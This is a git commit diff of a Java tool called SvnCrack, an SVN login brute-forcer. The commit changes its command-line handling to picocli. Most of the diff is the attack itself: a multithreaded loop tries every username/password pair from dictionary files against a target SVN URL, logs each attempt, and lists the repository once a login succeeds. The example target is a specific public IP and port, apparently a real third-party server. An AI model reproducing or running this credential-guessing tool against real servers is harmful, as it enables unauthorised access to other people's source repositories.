5f7b6e1155db0a670cbc6962ea38a0a087ce07a4
WINEZERO <kissloo@foxmail.com>
2024-11-13 10:37:23 +0800

    0.2 使用picocli命令行库减少代码数量
    0.2 使用picocli命令行库减少代码数量、不使用commons-cli

--- src/main/java/SvnCrack.java
+++ src/main/java/SvnCrack.java
@@ -7,76 +7,58 @@ import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicLong;
-import org.apache.commons.cli.*;
 
 import static Utils.DictUtils.*;
 import static Utils.PrintLog.*;
 import static Utils.SvnUtils.*;
 import static Utils.UserPassPair.replaceUserMarkInPass;
 
-public class SvnCrack {
+import picocli.CommandLine;
+import picocli.CommandLine.Command;
+import picocli.CommandLine.Option;
+
+@Command(name = "SvnCrack", description = "SVN Cracking Tool", version = "SvnCrack v0.2 20241113", mixinStandardHelpOptions = true)
+public class SvnCrack implements Runnable{
+    @Option(names = { "-t", "--target" }, required = true, description = "SVN login url, like svn://47.56.88.224:1688")
+    // 设置 SVN 仓库的 URL
+    private static String SVNLoginUrl = null;
+
+    // 你要列出的目录路径 报错错的时候会提示实际目录
+    @Option(names = { "-r", "--repo" }, description = "SVN repo path to check. like /data/svn/repo, not must need", defaultValue = "/")
+    private static String SVNCheckPath= null;
+
+    @Option(names = { "-U", "--user-dict" }, description = "User dict file path, default=user.txt", defaultValue = "user.txt")
+    //账号文件
+    private static String userDictPath= null;
+
+    @Option(names = { "-P", "--pass-dict" }, description = "Pass dict file path, default=pass.txt", defaultValue = "pass.txt")
+    //密码文件
+    private static String passDictPath= null;
+
     public static void main(String[] args){
-        //输出版本信息
-        String version = "0.1 20241112";
-        print_info(String.format("Current Tools Version is: %s", version));
+        int exitCode = new CommandLine(new SvnCrack()).execute(args);
+        System.exit(exitCode);
+    }
 
-        // 设置 SVN 仓库的 URL 和路径
-        String SVNLoginUrl = null;
-        String SVNCheckPath= null;
-        //String SVNLoginUrl = "svn://47.56.88.224:1688";
-        //String SVNCheckPath = "/data/svn/reon"; // 你要列出的目录路径 包错的时候会提示实际目录
-        //读取账号密码文件
-        String userDictPath= null;
-        String passDictPath= null;
-        //String userDict = "C:\\Users\\WINDOWS\\GithubProject\\CrackCaptchaLogin_Plus\\target\\CrackCaptcahLogin-3.8\\dict\\username-5000.txt";
-        //String passDict = "C:\\Users\\WINDOWS\\GithubProject\\CrackCaptchaLogin_Plus\\target\\CrackCaptcahLogin-3.8\\dict\\password-5.txt";
-
-        // 添加选项并设置默认值
-        Options options = new Options();
-        try {
-            Option SVNLoginUrlOption = new Option("t", "target", true, "SVN login URL");
-            SVNLoginUrlOption.setRequired(true);
-            SVNLoginUrlOption.setArgName("SVNLoginUrl");
-            options.addOption(SVNLoginUrlOption);
-
-            Option SVNRepoOption = new Option("r", "repo", true, "SVN repo path to check, not must need.");
-            SVNRepoOption.setRequired(false);
-            SVNRepoOption.setArgName("SVNCheckPath");
-            options.addOption(SVNRepoOption);
-
-            Option userDictOption = new Option("U", "user-dict", true, "User dict file path");
-            userDictOption.setRequired(false);
-            userDictOption.setArgName("UserDict");
-            options.addOption(userDictOption);
-
-            Option passDictOption = new Option("P", "pass-dict", true, "Password dict file path");
-            passDictOption.setRequired(false);
-            passDictOption.setArgName("PassDict");
-            options.addOption(passDictOption);
-
-            CommandLineParser parser = new DefaultParser();
-            CommandLine cmd = parser.parse(options, args);
-            SVNLoginUrl = cmd.getOptionValue("t");
-            SVNCheckPath = cmd.getOptionValue("r", "/");
-            userDictPath = cmd.getOptionValue("U", "user.txt");
-            passDictPath = cmd.getOptionValue("P", "pass.txt");
-        } catch (ParseException e) {
-            print_error(String.format("SvnCrack CMD Parse Error:%s\n%s", options, e.getMessage()));
-            System.exit(1);
+    @Override
+    //run 方法：实现了 Runnable 接口，当命令行参数解析成功后，CommandLine.run 会调用这个方法。
+    public void run() {
+        if (SVNLoginUrl==null||SVNCheckPath==null||userDictPath==null||passDictPath==null) {
+            print_error("参数输入不完整,请重新输入!!!");
+            return;
         }
 
-        if (SVNLoginUrl==null||SVNCheckPath==null||userDictPath==null||passDictPath==null) return;
         List<String> userList = DictUtils.readDictFile(userDictPath);
         List<String> passList = DictUtils.readDictFile(passDictPath);
 
-        String globalCrackHistoryFilePath = SVNLoginUrl.replace(":","_").replace("/","_") + ".history.log";
-        String globalCrackLogRecodeFilePath = SVNLoginUrl.replace(":","_").replace("/","_")+ ".result.csv";
-        String globalPairSeparator = ":";
-
         if (userList.isEmpty()||passList.isEmpty()){
-            System.out.println(String.format("[!] Please Check!!! Read User Or Pass Dict Was Empty: USER:%s PASS:%s", userList.size(), passList.size() ));
+            System.out.printf("[!] Please Check!!! Read User Or Pass Dict Was Empty: USER:%s PASS:%s%n", userList.size(), passList.size() );
             return;
         }
+
+        String historyFilePath = SVNLoginUrl.replace(":","_").replace("/","_") + ".history.log";
+        String logRecodeFilePath = SVNLoginUrl.replace(":","_").replace("/","_")+ ".result.csv";
+        String pairSeparator = ":";
 
         //加载加载账号字典
         List<UserPassPair> userPassPairList =  createCartesianUserPassPairs(userList, passList);
@@ -87,8 +69,8 @@ public class SvnCrack {
         print_debug(String.format("Pairs Count After Replace Mark Str [%s]", userPassPairList.size()));
 
         //读取 history 文件,排除历史扫描记录 ，
-        userPassPairList = excludeHistoryPairs(userPassPairList, globalCrackHistoryFilePath, globalPairSeparator);
-        print_debug(String.format("Pairs Count After Exclude History [%s] From [%s]", userPassPairList.size(), globalCrackHistoryFilePath));
+        userPassPairList = excludeHistoryPairs(userPassPairList, historyFilePath, pairSeparator);
+        print_debug(String.format("Pairs Count After Exclude History [%s] From [%s]", userPassPairList.size(), historyFilePath));
 
         //判断字典列表数量是否大于0
         if(userPassPairList.size() > 0){
@@ -116,15 +98,13 @@ public class SvnCrack {
 
             //进行日志记录
             String title = "SVN_URL,USERNAME,PASSWORD,STATUS";
-            writeTitleToFile(globalCrackLogRecodeFilePath, title);
+            writeTitleToFile(logRecodeFilePath, title);
 
             // 进行爆破操作
             for (int index = 0; index < userPassPairList.size(); index++) {
                 final int currentIndex = index;
                 final UserPassPair userPassPair = userPassPairList.get(currentIndex);
                 final List<UserPassPair> finalUserPassPairList = userPassPairList;
-                final String finalSVNLoginUrl = SVNLoginUrl;
-                final String finalSVNCheckPath = SVNCheckPath;
 
                 executorService.submit(() -> {
                     // 如果已经成功认证，不再执行后续任务
@@ -140,20 +120,18 @@ public class SvnCrack {
                     String svnUser = userPassPair.getUsername();
                     String svnPass = userPassPair.getPassword();
 
-                    if (checkAuthentication(finalSVNLoginUrl, svnUser, svnPass)) {
-                        System.out.println(String.format("[+] %s/%s Authentication success: %s:%s", currentIndex + 1, finalUserPassPairList.size(), svnUser, svnPass));
+                    if (checkAuthentication(SVNLoginUrl, svnUser, svnPass)) {
+                        System.out.printf("[+] %s/%s Authentication success: %s:%s%n", currentIndex + 1, finalUserPassPairList.size(), svnUser, svnPass);
                         authenticationSuccessful.set(true); // 设置成功标志
-                        SVNRepositoryShow(finalSVNLoginUrl, finalSVNCheckPath, svnUser, svnPass);
-                    } else {
-                        //System.err.println(String.format("[-] %s/%s Authentication failed: %s:%s", currentIndex + 1, finalUserPassPairList.size(), svnUser, svnPass));
+                        SVNRepositoryShow(SVNLoginUrl, SVNCheckPath, svnUser, svnPass);
                     }
 
                     //记录爆破历史
-                    writeUserPassPairToFile(globalCrackHistoryFilePath, globalPairSeparator, userPassPair);
+                    writeUserPassPairToFile(historyFilePath, pairSeparator, userPassPair);
 
                     //记录完整的爆破状态
-                    String content = String.format("\"%s\",\"%s\",\"%s\",\"%s\"", finalSVNLoginUrl, svnUser, svnPass, authenticationSuccessful.get());
-                    writeLineToFile(globalCrackLogRecodeFilePath, content);
+                    String content = String.format("\"%s\",\"%s\",\"%s\",\"%s\"", SVNLoginUrl, svnUser, svnPass, authenticationSuccessful.get());
+                    writeLineToFile(logRecodeFilePath, content);
 
 
                     if (currentIndex % 10 == 0) {
@@ -167,12 +145,12 @@ public class SvnCrack {
                         long remainingTasks = totalTasks.get() - completedTasks.get();
                         long estimatedRemainingTime = averageTime * remainingTasks / 1000 / 60;
                         // 输出剩余时间
-                        System.out.println(String.format("[*] %s/%s Estimated remaining time:%dMIN|%dHOUR",
+                        System.out.printf("[*] %s/%s Estimated remaining time:%dMIN|%dHOUR%n",
                                 currentIndex + 1,
                                 finalUserPassPairList.size(),
                                 estimatedRemainingTime,
                                 estimatedRemainingTime/60
-                        ));
+                        );
                     }
 
                     // 如果已经成功认证，不再执行后续任务
@@ -193,7 +171,7 @@ public class SvnCrack {
             }
 
         } catch (InterruptedException e) {
-            System.err.println(String.format("Error Occurred: %s", e.getMessage()));
+            System.err.printf("Error Occurred: %s%n", e.getMessage());
             e.printStackTrace();
         }
     }
